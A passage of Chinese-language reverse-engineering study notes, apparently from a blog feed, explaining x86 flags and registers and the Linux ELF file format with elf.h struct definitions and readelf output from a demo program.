AM 标志联合使用，这两个标志位同时置 1 启用对内存引用的对齐检查，同时置 0 表示禁用对齐 检查。对齐检查仅在用户态下进行，0 特权级下不做检查。</li><li>VIF（bit 19）：虚拟中断标志，是 IF 标志的一个虚拟映像，与 VIP 标志 一起使用，当控制寄存器 CR4 中的 VME 或者 PVI 标志位置 1 且 IOPL 小 于 3 时，处理器只识别 VIF 标志。</li></ul></li></ul><p>==EIP寄存器==</p><p>指令指针寄存器存储了当前代码段的偏移，指向了下一条要执行的指令，系统根据 该寄存器从内存中取出指令，然后再译码执行。</p><h1>第三章 Linux ELF文件</h1><p>什么是可执行文件？</p><ul><li>==广义==：文件中的数据是可执行的代码文件<ul><li>比如  .exe,  .py,  .sh,  .out……</li></ul></li><li>==狭义==： 文件中的数据是机器码的文件<ul><li>比如 .out, .dll, .so,  .exe</li></ul></li></ul><p>可执行文件分类</p><ul><li><p>==Windows PE文件==</p><ul><li>可执行程序<ul><li>.exe</li></ul></li><li>动态链接库<ul><li>.dll</li></ul></li><li>静态链接库<ul><li>.lib</li></ul></li></ul></li><li><p>==Linux ELF文件==</p><ul><li>可执行程序<ul><li>.out</li></ul></li><li>动态链接库<ul><li>.so</li></ul></li><li>静态链接库<ul><li>.a</li></ul></li></ul><blockquote><p>链接库的作用我个人理解就是辅助可执行程序，一种映射的关系，大家可以去网上了解一下具体原理</p></blockquote><p>ELF文件结构</p><p><img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220107153937005.png" alt="image-20220107153937005"></p><p><img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220107155625781.png" alt="image-20220107155625781"></p><p>这是个宏观的ELF文件结构图，下面有一些细节</p><p><img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220107155859986.png" alt="image-20220107155859986"></p><p><strong>来看一个简化的ELF文件结构</strong></p><p><img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220107154212789.png" alt="image-20220107154212789"></p><blockquote><p>可以看到，在这个简化的 ELF 文件中，开头是一个“文件头”，之后分别是代码段、 数据段和.bss段。程序源代码编译后，执行语句变成机器指令，保存在 .text 段；已初始化的全局变量和局部静态变量都保存在 .data 段；未初始化的全局变量和局部静态变量则放在 .bss 段。 把程序指令和程序数据分开存放有许多好处，从安全的角度讲，当程序被加载后， 数据和指令分别被映射到两个虚拟区域。由于数据区域对于进程来说是可读写的， 而指令区域对于进程来说是只读的，所以这两个虚存区域的权限可以被分别设置成 可读写和只读，可以防止程序的指令被改写和利用。</p></blockquote><p>ELF 文件结构</p><blockquote><p>对象文件参与程序链接（构建程序）和程序执行（运行程序）。ELF 结构几相关信息在 /usr/include/elf.h 文件中。</p></blockquote></li></ul><p>​<img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220107160534951.png" alt="image-20220107160534951"></p><ul><li>ELF 文件头（ELF Header） 在目标文件格式的最前面，包含了描述整个文件的基本属性。</li><li>程序头表（Program Header Table） 是可选的，它告诉系统怎样创建一个进程映像。可执行文件必须有程序头表，而重定位文件不需要。</li><li>段（Section） 包含了链接视图中大量的目标文件信息。</li><li>段表（Section Header Table） 包含了描述文件中所有段的信息</li></ul><p>ELF 文件头必然存在于 ELF 文件的开头，表明这是一个 ELF 文件。</p><p>ELF文件头定义如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">unsigned char e_ident[EI_NIDENT]; /* Magic number and other info */</span><br><span class="line">Elf32_Half e_type; /* Object file type */</span><br><span class="line">Elf32_Half e_machine; /* Architecture */</span><br><span class="line">Elf32_Word e_version; /* Object file version */</span><br><span class="line">Elf32_Addr e_entry; /* Entry point virtual address */</span><br><span class="line">Elf32_Off e_phoff; /* Program header table file offset*/</span><br><span class="line">Elf32_Off e_shoff; /* Section header table file offset*/</span><br><span class="line">Elf32_Word e_flags; /* Processor-specific flags */</span><br><span class="line">Elf32_Half e_ehsize; /* ELF header size in bytes */</span><br><span class="line">Elf32_Half e_phentsize; /* Program header table entry size */</span><br><span class="line">Elf32_Half e_phnum; /* Program header table entry count */</span><br><span class="line">Elf32_Half e_shentsize; /* Section header table entry size */</span><br><span class="line">Elf32_Half e_shnum; /* Section header table entry count */</span><br><span class="line">Elf32_Half e_shstrndx; /* Section header string table index */</span><br><span class="line">&#125; Elf32_Ehdr;</span><br><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">unsigned char e_ident[EI_NIDENT]; /* Magic number and other info */</span><br><span class="line">Elf64_Half e_type; /* Object file type */</span><br><span class="line">Elf64_Half e_machine; /* Architecture */</span><br><span class="line">Elf64_Word e_version; /* Object file version */</span><br><span class="line">Elf64_Addr e_entry; /* Entry point virtual address */</span><br><span class="line">Elf64_Off e_phoff; /* Program header table file offset*/</span><br><span class="line">Elf64_Off e_shoff; /* Section header table file offset*/</span><br><span class="line">Elf64_Word e_flags; /* Processor-specific flags */</span><br><span class="line">Elf64_Half e_ehsize; /* ELF header size in bytes */</span><br><span class="line">Elf64_Half e_phentsize; /* Program header table entry size */</span><br><span class="line">Elf64_Half e_phnum; /* Program header table entry count */</span><br><span class="line">Elf64_Half e_shentsize; /* Section header table entry size */</span><br><span class="line">Elf64_Half e_shnum; /* Section header table entry count */</span><br><span class="line">Elf64_Half e_shstrndx; /* Section header string table index */</span><br><span class="line">&#125; Elf64_Ehdr;</span><br></pre></td></tr></table></figure><blockquote><p>e_ident 保存着 ELF 的幻数和其他信息，最前面四个字节是幻数，用字符串表 示为 \177ELF ，其后的字节如果是 32 位则是 ELFCLASS32 (1)，如果是 64 位 则是 ELFCLASS64 (2)，再其后的字节表示端序，小端序为 ELFDATA2LSB (1)， 大端序为 ELFDATA2LSB (2)。最后一个字节则表示 ELF 的版本。</p></blockquote><p>现在我们使用 readelf 命令来查看 elfDome.out 的文件头：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -h elfDemo.out</span><br><span class="line">ELF Header:</span><br><span class="line">Magic: 7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00</span><br><span class="line">Class: ELF32</span><br><span class="line">Data: 2&#x27;s complement, little endi</span><br><span class="line">an</span><br><span class="line">Version: 1 (current)</span><br><span class="line">OS/ABI: UNIX - System V</span><br><span class="line">ABI Version: 0</span><br><span class="line">Type: DYN (Shared object file)</span><br><span class="line">Machine: Intel 80386</span><br><span class="line">Version: 0x1</span><br><span class="line">Entry point address: 0x3e0</span><br><span class="line">Start of program headers: 52 (bytes into file)</span><br><span class="line">Start of section headers: 6288 (bytes into file)</span><br><span class="line">Flags: 0x0</span><br><span class="line">Size of this header: 52 (bytes)</span><br><span class="line">Size of program headers: 32 (bytes)</span><br><span class="line">Number of program headers: 9</span><br><span class="line">Size of section headers: 40 (bytes)</span><br><span class="line">Number of section headers: 30</span><br><span class="line">Section header string table index: 29</span><br></pre></td></tr></table></figure><p>程序头</p><blockquote><p>程序头表是由 ELF 头的 e_phoff 指定的偏移量和 e_phentsize 、 e_phnum 共同确定大小的表格组成。 e_phentsize 表示表格中程序头的大小， e_phnum 表示表格中程序头的数量。</p></blockquote><p>程序头的定义如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">Elf32_Word p_type; /* Segment type */</span><br><span class="line">Elf32_Off p_offset; /* Segment file offset */</span><br><span class="line">Elf32_Addr p_vaddr; /* Segment virtual address */</span><br><span class="line">Elf32_Addr p_paddr; /* Segment physical address */</span><br><span class="line">Elf32_Word p_filesz; /* Segment size in file */</span><br><span class="line">Elf32_Word p_memsz; /* Segment size in memory */</span><br><span class="line">Elf32_Word p_flags; /* Segment flags */</span><br><span class="line">Elf32_Word p_align; /* Segment alignment */</span><br><span class="line">&#125; Elf32_Phdr;</span><br><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">Elf64_Word p_type; /* Segment type */</span><br><span class="line">Elf64_Word p_flags; /* Segment flags */</span><br><span class="line">Elf64_Off p_offset; /* Segment file offset */</span><br><span class="line">Elf64_Addr p_vaddr; /* Segment virtual address */</span><br><span class="line">Elf64_Addr p_paddr; /* Segment physical address */</span><br><span class="line">Elf64_Xword p_filesz; /* Segment size in file */</span><br><span class="line">Elf64_Xword p_memsz; /* Segment size in memory */</span><br><span class="line">    Elf64_Xword p_align; /* Segment alignment */</span><br><span class="line">&#125; Elf64_Phdr;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用 readelf 来查看程序头：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -l elfDemo.out</span><br><span class="line">Elf file type is DYN (Shared object file)</span><br><span class="line">Entry point 0x3e0</span><br><span class="line">There are 9 program headers, starting at offset 52</span><br><span class="line">Program Headers:</span><br><span class="line">Type Offset VirtAddr PhysAddr FileSiz MemSiz</span><br><span class="line">Flg Align</span><br><span class="line">PHDR 0x000034 0x00000034 0x00000034 0x00120 0x00120</span><br><span class="line">R E 0x4</span><br><span class="line">INTERP 0x000154 0x00000154 0x00000154 0x00013 0x00013</span><br><span class="line">R 0x1</span><br><span class="line">[Requesting program interpreter: /lib/ld-linux.so.2]</span><br><span class="line">LOAD 0x000000 0x00000000 0x00000000 0x00780 0x00780</span><br><span class="line">R E 0x1000</span><br><span class="line">LOAD 0x000ef4 0x00001ef4 0x00001ef4 0x00130 0x0013c</span><br><span class="line">RW 0x1000</span><br><span class="line">DYNAMIC 0x000efc 0x00001efc 0x00001efc 0x000f0 0x000f0</span><br><span class="line">RW 0x4</span><br><span class="line">NOTE 0x000168 0x00000168 0x00000168 0x00044 0x00044</span><br><span class="line">R 0x4</span><br><span class="line">GNU_EH_FRAME 0x000624 0x00000624 0x00000624 0x00044 0x00044</span><br><span class="line">R 0x4</span><br><span class="line">GNU_STACK 0x000000 0x00000000 0x00000000 0x00000 0x00000</span><br><span class="line">RW 0x10</span><br><span class="line">GNU_RELRO 0x000ef4 0x00001ef4 0x00001ef4 0x0010c 0x0010c</span><br><span class="line">R 0x1</span><br><span class="line">Section to Segment mapping:</span><br><span class="line">Segment Sections...</span><br><span class="line">00</span><br><span class="line">01 .interp</span><br><span class="line">02 .interp .note.ABI-tag .note.gnu.build-id .gnu.hash .dy</span><br><span class="line">nsym .dynstr .gnu.version .gnu.version_r .rel.dyn .rel.plt .init</span><br><span class="line">.plt .plt.got .text .fini .rodata .eh_frame_hdr .eh_frame</span><br><span class="line">03 .init_array .fini_array .dynamic .got .got.plt .data .</span><br><span class="line">bss</span><br><span class="line">04 .dynamic</span><br><span class="line">05 .note.ABI-tag .note.gnu.build-id</span><br><span class="line">06 .eh_frame_hdr</span><br><span class="line">07</span><br><span class="line">08 .init_array .fini_array .dynamic .got</span><br></pre></td></tr></table></figure><p>段</p><blockquote><p>段表（Section Header Table）是一个以 Elf32_Shdr 结构体为元素的数组，每 个结构体对应一个段，它描述了各个段的信息。ELF 文件头的 e_shoff 成员给 出了段表在 ELF 中的偏移， e_shnum 成员给出了段描述符的数 量， e_shentsize 给出了每个段描述符的大小。</p></blockquote><p>段表定义：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">Elf32_Word sh_name; /* Section name (string tbl index) */</span><br><span class="line">Elf32_Word sh_type; /* Section type */</span><br><span class="line">Elf32_Word sh_flags; /* Section flags */</span><br><span class="line">Elf32_Addr sh_addr; /* Section virtual addr at execution */</span><br><span class="line">Elf32_Off sh_offset; /* Section file offset */</span><br><span class="line">Elf32_Word sh_size; /* Section size in bytes */</span><br><span class="line">Elf32_Word sh_link; /* Link to another section */</span><br><span class="line">Elf32_Word sh_info; /* Additional section information */</span><br><span class="line">Elf32_Word sh_addralign; /* Section alignment */</span><br><span class="line">Elf32_Word sh_entsize; /* Entry size if section holds table */</span><br><span class="line">&#125; Elf32_Shdr;</span><br><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">Elf64_Word sh_name; /* Section name (string tbl index) */</span><br><span class="line">Elf64_Word sh_type; /* Section type */</span><br><span class="line">Elf64_Xword sh_flags; /* Section flags */</span><br><span class="line">Elf64_Addr sh_addr; /* Section virtual addr at execution */</span><br><span class="line">Elf64_Off sh_offset; /* Section file offset */</span><br><span class="line">Elf64_Xword sh_size; /* Section size in bytes */</span><br><span class="line">Elf64_Word sh_link; /* Link to another section */</span><br><span class="line">Elf64_Word sh_info; /* Additional section informatio</span><br><span class="line">n */</span><br><span class="line">Elf64_Xword sh_addralign; /* Section alignment */</span><br><span class="line">Elf64_Xword sh_entsize; /* Entry size if section holds table */</span><br><span class="line">&#125; Elf64_Shdr;</span><br></pre></td></tr></table></figure><p>使用 readelf 命令查看目标文件中完整的段：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -S elfDemo.o</span><br><span class="line">There are 15 section headers, starting at offset 0x41c:</span><br><span class="line">Section Headers:</span><br><span class="line">[Nr] Name Type Addr Off Size</span><br><span class="line">ES Flg Lk Inf Al</span><br><span class="line">[ 0] NULL 00000000 000000 000000</span><br><span class="line">00 0 0 0</span><br><span class="line">[ 1] .group GROUP 00000000 000034 000008</span><br><span class="line">04 12 16 4</span><br><span class="line">[ 2] .text PROGBITS 00000000 00003c 000078</span><br><span class="line">00 AX 0 0 1</span><br><span class="line">[ 3] .rel.text REL 00000000 000338 000048</span><br><span class="line">08 I 12 2 4</span><br><span class="line">[ 4] .data PROGBITS 00000000 0000b4 000008</span><br><span class="line">00 WA 0 0 4</span><br><span class="line">[ 5] .bss NOBITS 00000000 0000bc 000004</span><br><span class="line">00 WA 0 0 4</span><br><span class="line">[ 6] .rodata PROGBITS 00000000 0000bc 000004</span><br><span class="line">00 A 0 0 1</span><br><span class="line">[ 7] .text.__x86.get_p PROGBITS 00000000 0000c0 000004</span><br><span class="line">00 AXG 0 0 1</span><br><span class="line">[ 8] .comment PROGBITS 00000000 0000c4 000012</span><br><span class="line">01 MS 0 0 1</span><br><span class="line">[ 9] .note.GNU-stack PROGBITS 00000000 0000d6 000000</span><br><span class="line">00 0 0 1</span><br><span class="line">[10] .eh_frame PROGBITS 00000000 0000d8 00007c</span><br><span class="line">00 A 0 0 4</span><br><span class="line">[11] .rel.eh_frame REL 00000000 000380 000018</span><br><span class="line">08 I 12 10 4</span><br><span class="line">[12] .symtab SYMTAB 00000000 000154 000140</span><br><span class="line">10 13 13 4</span><br><span class="line">[13] .strtab STRTAB 00000000 000294 0000a2</span><br><span class="line">00 0 0 1</span><br><span class="line">[14] .shstrtab STRTAB 00000000 000398 000082</span><br><span class="line">00 0 0 1</span><br><span class="line">Key to Flags:</span><br><span class="line">W (write), A (alloc), X (execute), M (merge), S (strings), I (</span><br><span class="line">info),</span><br><span class="line">L (link order), O (extra OS processing required), G (group), T</span><br><span class="line">(TLS),</span><br><span class="line">C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">p (processor specific)</span><br></pre></td></tr></table></figure><p>注意，ELF 段表的第一个元素是被保留的，类型为 NULL。</p><p>字符串表</p><blockquote><p>字符串表以段的形式存在，包含了以 null 结尾的字符序列。对象文件使用这些字 符串来表示符号和段名称，引用字符串时只需给出在表中的偏移即可。字符串表的 第一个字符和最后一个字符为空字符，以确保所有字符串的开始和终止。通常段名为 .strtab 的字符串表是 字符串表（Strings Table），段名为 .shstrtab 的 是段表字符串表（Section Header String Table）。</p></blockquote><p><img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220107161917410.png" alt="image-20220107161917410"></p><p>可以使用 readelf 读取这两个表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -x .strtab elfDemo.o</span><br><span class="line">Hex dump of section &#x27;.strtab&#x27;:</span><br><span class="line">0x00000000 00656c66 44656d6f 2e63006c 6f63616c .elfDemo.c.loca</span><br><span class="line">l</span><br><span class="line">0x00000010 5f737461 7469635f 696e6974 5f766172 _static_init_va</span><br><span class="line">r</span><br><span class="line">0x00000020 2e323139 35006c6f 63616c5f 73746174 .2195.local_sta</span><br><span class="line">t</span><br><span class="line">0x00000030 69635f75 6e696e69 745f7661 722e3231 ic_uninit_var.2</span><br><span class="line">1</span><br><span class="line">0x00000040 39360067 6c6f6261 6c5f696e 69745f76 96.global_init_</span><br><span class="line">v</span><br><span class="line">0x00000050 61720067 6c6f6261 6c5f756e 696e6974 ar.global_unini</span><br><span class="line">t</span><br><span class="line">0x00000060 5f766172 0066756e 63005f5f 7838362e _var.func.__x86</span><br><span class="line">.</span><br><span class="line">0x00000070 6765745f 70635f74 68756e6b 2e617800 get_pc_thunk.ax</span><br><span class="line">.</span><br><span class="line">0x00000080 5f474c4f 42414c5f 4f464653 45545f54 _GLOBAL_OFFSET_</span><br><span class="line">T</span><br><span class="line">0x00000090 41424c45 5f007072 696e7466 006d6169 ABLE_.printf.ma</span><br><span class="line">i</span><br><span class="line">0x000000a0 6e00</span><br><span class="line">$ readelf -x .shstrtab elfDemo.o</span><br><span class="line">Hex dump of section &#x27;.shstrtab&#x27;:</span><br><span class="line">0x00000000 002e7379 6d746162 002e7374 72746162 ..symtab..strta</span><br><span class="line">b</span><br><span class="line">0x00000010 002e7368 73747274 6162002e 72656c2e ..shstrtab..rel</span><br><span class="line">.</span><br><span class="line">0x00000020 74657874 002e6461 7461002e 62737300 text..data..bss</span><br><span class="line">.</span><br><span class="line">0x00000030 2e726f64 61746100 2e746578 742e5f5f .rodata..text._</span><br><span class="line">_</span><br><span class="line">0x00000040 7838362e 6765745f 70635f74 68756e6b x86.get_pc_thun</span><br><span class="line">k</span><br><span class="line">0x00000050 2e617800 2e636f6d 6d656e74 002e6e6f .ax..comment..n</span><br><span class="line">o</span><br><span class="line">0x00000060 74652e47 4e552d73 7461636b 002e7265 te.GNU-stack..r</span><br><span class="line">e</span><br><span class="line">0x00000070 6c2e6568 5f667261 6d65002e 67726f75 l.eh_frame..gro</span><br><span class="line">u</span><br><span class="line">0x00000080 7000</span><br></pre></td></tr></table></figure><p>符号表</p><p>目标文件的符号表保存了定位和重定位程序的符号定义和引用所需的信息。符号表 索引是这个数组的下标。索引０指向表中的第一个条目，作为未定义的符号索引。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">Elf32_Word st_name; /* Symbol name (string tbl index</span><br><span class="line">) */</span><br><span class="line">Elf32_Addr st_value; /* Symbol value */</span><br><span class="line">Elf32_Word st_size; /* Symbol size */</span><br><span class="line">unsigned char st_info; /* Symbol type and binding */</span><br><span class="line">unsigned char st_other; /* Symbol visibility */</span><br><span class="line">Elf32_Section st_shndx; /* Section index */</span><br><span class="line">&#125; Elf32_Sym;</span><br><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">Elf64_Word st_name; /* Symbol name (string tbl index</span><br><span class="line">) */</span><br><span class="line">unsigned char st_info; /* Symbol type and binding */</span><br><span class="line">unsigned char st_other; /* Symbol visibility */</span><br><span class="line">Elf64_Section st_shndx; /* Section index */</span><br><span class="line">Elf64_Addr st_value; /* Symbol value */</span><br><span class="line">Elf64_Xword st_size; /* Symbol size */</span><br><span class="line">&#125; Elf64_Sym;</span><br></pre></td></tr></table></figure><p>重定位</p><blockquote><p>重定位是连接符号定义与符号引用的过程。可重定位文件必须具有描述如何修改段 内容的信息，从而运行可执行文件和共享对象文件保存进程程序映像的正确信息。</p></blockquote><p>重定位定义：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">Elf32_Addr r_offset; /* Address */</span><br><span class="line">Elf32_Word r_info; /* Relocation type and symbol in</span><br><span class="line">dex */</span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">Elf64_Addr r_offset; /* Address */</span><br><span class="line">Elf64_Xword r_info; /* Relocation type and symbol index */</span><br><span class="line">Elf64_Sxword r_addend; /* Addend */</span><br><span class="line">&#125; Elf64_Rela;</span><br></pre></td></tr></table></figure><p>查看重定位表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -r elfDemo.o</span><br><span class="line">Relocation section &#x27;.rel.text&#x27; at offset 0x338 contains 9 entrie</span><br><span class="line">s:</span><br><span class="line">Offset Info Type Sym.Value Sym. Name</span><br><span class="line">00000008 00001002 R_386_PC32 00000000 __x86.get_pc_thu</span><br><span class="line">nk.ax</span><br><span class="line">0000000d 0000110a R_386_GOTPC 00000000 _GLOBAL_OFFSET_T</span><br><span class="line">ABLE_</span><br><span class="line">00000019 00000509 R_386_GOTOFF 00000000 .rodata</span><br><span class="line">00000021 00001204 R_386_PLT32 00000000 printf</span><br><span class="line">00000040 00001002 R_386_PC32 00000000 __x86.get_pc_thu</span><br><span class="line">nk.ax</span><br><span class="line">00000045 0000110a R_386_GOTPC 00000000 _GLOBAL_OFFSET_T</span><br><span class="line">ABLE_</span><br><span class="line">00000052 00000d09 R_386_GOTOFF 00000000 global_init_var</span><br><span class="line">0000005d 00000309 R_386_GOTOFF 00000000 .data</span><br><span class="line">00000068 00000f02 R_386_PC32 00000000 func</span><br><span class="line">Relocation section &#x27;.rel.eh_frame&#x27; at offset 0x380 contains 3 en</span><br><span class="line">tries:</span><br><span class="line">Offset Info Type Sym.Value Sym. Name</span><br><span class="line">00000020 00000202 R_386_PC32 00000000 .text</span><br><span class="line">00000044 00000202 R_386_PC32 00000000 .text</span><br><span class="line">00000070 00000802 R_386_PC32 00000000 .text.__x86.get_</span><br><span class="line">pc_thu</span><br></pre></td></tr></table></figure><h1>第四章 Windows PE文件</h1>]]></content>
      
      
      <categories>
          
          <category> reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆向小叙</title>
      <link href="//5d182775.html"/>
      <url>//5d182775.html</url>
      
